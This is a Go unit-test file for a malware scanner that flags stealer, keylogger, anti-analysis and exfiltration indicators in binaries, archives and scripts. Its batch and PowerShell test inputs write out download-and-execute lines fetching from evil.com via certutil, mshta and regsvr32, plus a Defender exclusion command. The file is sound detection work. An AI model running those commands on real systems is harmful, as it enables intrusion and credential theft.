package security

import (
	"archive/zip"
	"encoding/binary"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestIsPE(t *testing.T) {
	tests := []struct {
		name     string
		data     []byte
		expected bool
	}{
		{
			name:     "valid PE",
			data:     makePE([]byte("MZ\x90\x00"), nil),
			expected: true,
		},
		{
			name:     "too short",
			data:     []byte("MZ"),
			expected: false,
		},
		{
			name:     "not PE",
			data:     bytesRepeat(0x41, 100),
			expected: false,
		},
		{
			name:     "empty",
			data:     []byte{},
			expected: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := isPE(tt.data)
			if got != tt.expected {
				t.Errorf("isPE() = %v, want %v", got, tt.expected)
			}
		})
	}
}

func TestExtractASCIIStrings(t *testing.T) {
	data := []byte{0, 0, 'H', 'e', 'l', 'l', 'o', 0, 'W', 'o', 'r', 'l', 'd', 0}
	strings := extractASCIIStrings(data, 5)
	if len(strings) == 0 {
		t.Error("expected at least one string")
	}
	found := false
	for _, s := range strings {
		if s == "Hello" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected to find 'Hello' in extracted strings, got: %v", strings)
	}
}

func TestScanBytes_Clean(t *testing.T) {
	data := []byte{0, 0, 0, 'h', 'e', 'l', 'l', 'o', 0, 0, 0}
	result := ScanBytes(data, "test.exe")
	if !result.Clean {
		t.Errorf("expected clean result, got threats: %v", result.Threats)
	}
}

func TestScanBytes_BrowserStealer(t *testing.T) {
	payload := []byte("C:\\Users\\Data\\\x00\\local state\\\x00\\login data\\\x00end")
	result := ScanBytes(payload, "malware.exe")
	if result.Clean {
		t.Error("expected threats detected")
	}

	categories := map[string]bool{}
	for _, th := range result.Threats {
		categories[th.Category] = true
	}

	if !categories["Browser Stealer"] {
		t.Error("expected Browser Stealer threat category")
	}
}

func TestScanBytes_DiscordStealer(t *testing.T) {
	payload := []byte("binary\x00discord.com/api\x00stuff")
	result := ScanBytes(payload, "stealer.dll")
	if result.Clean {
		t.Error("expected threats detected")
	}

	found := false
	for _, th := range result.Threats {
		if th.Category == "Discord Stealer" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected Discord Stealer threat")
	}
}

func TestScanBytes_TelegramStealer(t *testing.T) {
	payload := []byte("data\x00tdesktop\\tdata\x00more")
	result := ScanBytes(payload, "infected.exe")
	if result.Clean {
		t.Error("expected threats detected")
	}

	found := false
	for _, th := range result.Threats {
		if th.Category == "Telegram Stealer" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected Telegram Stealer threat")
	}
}

func TestScanBytes_CryptoWallet(t *testing.T) {
	payload := []byte("data\x00metamask\x00wallet.dat\x00end")
	result := ScanBytes(payload, "trojan.exe")
	if result.Clean {
		t.Error("expected threats detected")
	}

	found := false
	for _, th := range result.Threats {
		if th.Category == "Crypto Wallet Stealer" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected Crypto Wallet Stealer threat")
	}
}

func TestScanBytes_Exfiltration(t *testing.T) {
	payload := []byte("binary\x00webhook\x00file.io\x00pastebin.com/api\x00end")
	result := ScanBytes(payload, "rat.exe")
	if result.Clean {
		t.Error("expected threats detected")
	}

	found := false
	for _, th := range result.Threats {
		if th.Category == "Data Exfiltration" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected Data Exfiltration threat")
	}
}

func TestScanBytes_StealerFramework(t *testing.T) {
	payload := []byte("data\x00redline\x00more\x00lumma\x00end")
	result := ScanBytes(payload, "malware.exe")
	if result.Clean {
		t.Error("expected threats detected")
	}

	categories := map[string]bool{}
	for _, th := range result.Threats {
		categories[th.Category] = true
	}

	if !categories["Stealer Framework"] {
		t.Error("expected Stealer Framework threat category")
	}
}

func TestScanBatch_SuspiciousPatterns(t *testing.T) {
	tests := []struct {
		name     string
		content  string
		wantThreat bool
	}{
		{
			name:      "powershell encoded",
			content:   "powershell -enc AAAA",
			wantThreat: true,
		},
		{
			name:      "certutil download",
			content:   "certutil -urlcache -split -f http://evil.com/payload.exe payload.exe",
			wantThreat: true,
		},
		{
			name:      "hidden powershell",
			content:   "powershell -windowstyle hidden -command malicious",
			wantThreat: true,
		},
		{
			name:      "mshta execution",
			content:   "mshta http://evil.com/payload.hta",
			wantThreat: true,
		},
		{
			name:      "regsvr32",
			content:   "regsvr32 /s /n /u /i:http://evil.com/scrobj.sct scrobj.dll",
			wantThreat: true,
		},
		{
			name:      "clean batch",
			content:   "echo Hello World\npause",
			wantThreat: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := ScanBytes([]byte(tt.content), "test.bat")
			if tt.wantThreat && result.Clean {
				t.Error("expected threats but found none")
			}
			if !tt.wantThreat && !result.Clean {
				t.Errorf("expected clean but found threats: %v", result.Threats)
			}
		})
	}
}

func TestScanPowerShell_Obfuscation(t *testing.T) {
	tests := []struct {
		name       string
		content    string
		wantThreat bool
	}{
		{
			name:       "base64 decode",
			content:    "[Convert]::FromBase64String('dGVzdA==')",
			wantThreat: true,
		},
		{
			name:       "invoke-expression",
			content:    "Invoke-Expression $malicious",
			wantThreat: true,
		},
		{
			name:       "defender exclusion",
			content:    "Add-MpPreference -ExclusionPath C:\\evil",
			wantThreat: true,
		},
		{
			name:       "scheduled task",
			content:    "Register-ScheduledTask -Action $action",
			wantThreat: true,
		},
		{
			name:       "clean ps1",
			content:    "Write-Host 'All good'",
			wantThreat: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := ScanBytes([]byte(tt.content), "test.ps1")
			if tt.wantThreat && result.Clean {
				t.Error("expected threats but found none")
			}
			if !tt.wantThreat && !result.Clean {
				t.Errorf("expected clean but found threats: %v", result.Threats)
			}
		})
	}
}

func TestScanUnexpectedExecutable(t *testing.T) {
	data := bytesRepeat(0x41, 100)
	result := ScanBytes(data, "svchost.exe")
	if result.Clean {
		t.Error("expected threat for masquerading filename")
	}
	found := false
	for _, th := range result.Threats {
		if th.Category == "Suspicious Filename" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected Suspicious Filename threat")
	}
}

func TestSeverity(t *testing.T) {
	tests := []struct {
		s    Severity
		want string
	}{
		{SeverityLow, "LOW"},
		{SeverityMedium, "MEDIUM"},
		{SeverityHigh, "HIGH"},
		{SeverityCritical, "CRITICAL"},
		{Severity(99), "UNKNOWN"},
	}
	for _, tt := range tests {
		if got := tt.s.String(); got != tt.want {
			t.Errorf("Severity(%d).String() = %q, want %q", tt.s, got, tt.want)
		}
	}
}

func TestFormatScanResult_Clean(t *testing.T) {
	r := &ScanResult{Clean: true, ScannedFiles: 5}
	msg := FormatScanResult(r)
	if !strings.Contains(msg, "CLEAN") {
		t.Error("expected CLEAN in message")
	}
}

func TestFormatScanResult_Threats(t *testing.T) {
	r := &ScanResult{Clean: false, ScannedFiles: 3, Threats: []Threat{
		{File: "test.exe", Category: "Test", Detail: "test detail", Severity: SeverityCritical, IOC: "test_ioc"},
	}}
	msg := FormatScanResult(r)
	if !strings.Contains(msg, "SECURITY THREAT DETECTED") {
		t.Error("expected threat detection message")
	}
	if !strings.Contains(msg, "test.exe") {
		t.Error("expected filename in message")
	}
}

func TestScanZip_Clean(t *testing.T) {
	tmpDir := t.TempDir()
	zipPath := filepath.Join(tmpDir, "clean.zip")

	createTestZip(t, zipPath, map[string][]byte{
		"readme.txt": []byte("Hello World"),
		"bin/winws.exe": bytesRepeat(0x41, 100),
	})

	result, err := ScanZip(zipPath, []string{"bin"})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !result.Clean {
		t.Errorf("expected clean zip, got threats: %v", result.Threats)
	}
}

func TestScanZip_WithThreat(t *testing.T) {
	tmpDir := t.TempDir()
	zipPath := filepath.Join(tmpDir, "malicious.zip")

	payload := []byte("binary\x00\\local state\\\x00\\login data\\\x00end")
	createTestZip(t, zipPath, map[string][]byte{
		"bin/winws.exe":     bytesRepeat(0x41, 100),
		"bin/stealer.dll":   payload,
	})

	result, err := ScanZip(zipPath, []string{"bin"})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.Clean {
		t.Error("expected threats in zip")
	}
}

func TestScanZip_NonExistent(t *testing.T) {
	_, err := ScanZip("/nonexistent/path.zip", nil)
	if err == nil {
		t.Error("expected error for non-existent zip")
	}
}

func TestScanFile(t *testing.T) {
	tmpDir := t.TempDir()
	cleanFile := filepath.Join(tmpDir, "clean.exe")
	os.WriteFile(cleanFile, bytesRepeat(0x41, 100), 0644)

	result, err := ScanFile(cleanFile)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !result.Clean {
		t.Errorf("expected clean file, got threats: %v", result.Threats)
	}
}

func TestScanFile_Malicious(t *testing.T) {
	tmpDir := t.TempDir()
	badFile := filepath.Join(tmpDir, "stealer.exe")
	payload := append(bytesRepeat(0x41, 20), []byte("discord.com/api\x00webhook\x00")...)
	os.WriteFile(badFile, payload, 0644)

	result, err := ScanFile(badFile)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.Clean {
		t.Error("expected threats in file")
	}
}

func TestScanFile_NotFound(t *testing.T) {
	_, err := ScanFile("/nonexistent/file.exe")
	if err == nil {
		t.Error("expected error for non-existent file")
	}
}

func TestIsScannableFile(t *testing.T) {
	tests := []struct {
		name     string
		expected bool
	}{
		{"malware.exe", true},
		{"lib.dll", true},
		{"driver.sys", true},
		{"script.bat", true},
		{"script.cmd", true},
		{"script.ps1", true},
		{"readme.txt", false},
		{"image.png", false},
		{"data.json", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := isScannableFile(tt.name)
			if got != tt.expected {
				t.Errorf("isScannableFile(%q) = %v, want %v", tt.name, got, tt.expected)
			}
		})
	}
}

func TestCheckIOCGroups(t *testing.T) {
	result := &ScanResult{Clean: true}

	lowerText := "some binary data with credentials and dpapi references"
	checkIOCGroups("test.exe", lowerText, result)

	if len(result.Threats) == 0 {
		t.Error("expected at least one threat")
	}
}

func TestMultipleThreats(t *testing.T) {
	payload := []byte("data\x00\\local state\\\x00discord.com/api\x00metamask\x00webhook\x00redline\x00")
	result := ScanBytes(payload, "mega_stealer.exe")

	if result.Clean {
		t.Error("expected threats detected")
	}

	if len(result.Threats) < 3 {
		t.Errorf("expected at least 3 threats, got %d", len(result.Threats))
	}

	categories := map[string]bool{}
	for _, th := range result.Threats {
		categories[th.Category] = true
	}

	expectedCategories := []string{"Browser Stealer", "Discord Stealer", "Crypto Wallet Stealer", "Data Exfiltration", "Stealer Framework"}
	for _, cat := range expectedCategories {
		if !categories[cat] {
			t.Errorf("missing category: %s", cat)
		}
	}
}

func TestUTF16Strings(t *testing.T) {
	utf16Data := []byte{'H', 0, 'e', 0, 'l', 0, 'l', 0, 'o', 0, 0, 0}
	strings := extractUTF16Strings(utf16Data, 4)

	found := false
	for _, s := range strings {
		if s == "Hello" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected to find 'Hello' in UTF-16 strings, got: %v", strings)
	}
}

func TestDPAPIThreat(t *testing.T) {
	payload := []byte("binary\x00CryptUnprotectData\x00vault\x00VaultCli\x00")
	result := ScanBytes(payload, "credstealer.exe")
	if result.Clean {
		t.Error("expected credential stealer threats")
	}

	found := false
	for _, th := range result.Threats {
		if th.Category == "Credential Stealer" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected Credential Stealer threat")
	}
}

func TestKeyloggerDetection(t *testing.T) {
	payload := []byte("binary\x00GetAsyncKeyState\x00SetWindowsHookExW\x00")
	result := ScanBytes(payload, "keylog.exe")
	if result.Clean {
		t.Error("expected keylogger threats")
	}

	found := false
	for _, th := range result.Threats {
		if th.Category == "Keylogger" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected Keylogger threat")
	}
}

func TestAntiAnalysisDetection(t *testing.T) {
	payload := []byte("binary\x00IsDebuggerPresent\x00CheckRemoteDebuggerPresent\x00CreateRemoteThread\x00")
	result := ScanBytes(payload, "evasion.exe")
	if result.Clean {
		t.Error("expected anti-analysis threats")
	}

	found := false
	for _, th := range result.Threats {
		if th.Category == "Anti-Analysis" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected Anti-Analysis threat")
	}
}

func bytesRepeat(b byte, n int) []byte {
	data := make([]byte, n)
	for i := range data {
		data[i] = b
	}
	return data
}

func makePE(mzHeader []byte, peData []byte) []byte {
	data := make([]byte, 256)
	copy(data, mzHeader)
	binary.LittleEndian.PutUint32(data[60:64], 128)
	copy(data[128:], []byte("PE\x00\x00"))
	if peData != nil {
		copy(data[132:], peData)
	}
	return data
}

func createTestZip(t *testing.T, zipPath string, files map[string][]byte) {
	t.Helper()

	f, err := os.Create(zipPath)
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()

	w := zip.NewWriter(f)
	defer w.Close()

	for name, data := range files {
		fw, err := w.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := fw.Write(data); err != nil {
			t.Fatal(err)
		}
	}
}
